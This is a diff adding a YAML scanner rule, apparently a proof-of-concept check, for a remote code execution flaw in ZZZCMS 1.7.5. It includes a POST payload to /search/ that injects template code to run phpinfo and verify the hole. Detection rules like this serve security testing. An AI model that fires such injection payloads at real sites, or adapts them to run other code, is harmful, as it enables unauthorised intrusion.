@@ -1,0 +1,16 @@
+name: poc-yaml-zzzcms-rce
+rules:
+  - method: POST
+    path: /search/
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      keys={if:array_map(base_convert(27440799224,10,32),array(1))}{end if}
+    follow_redirects: false
+    expression: |
+      response.body.bcontains(bytes("phpinfo")) && response.body.bcontains(bytes("PHP Version")) && response.body.bcontains(bytes("Zend Multibyte Support")) && response.status == 200
+detail:
+  author: 1au
+  zzzcms_Vesion: 1.7.5
+  links:
+    - https://xz.aliyun.com/t/4471
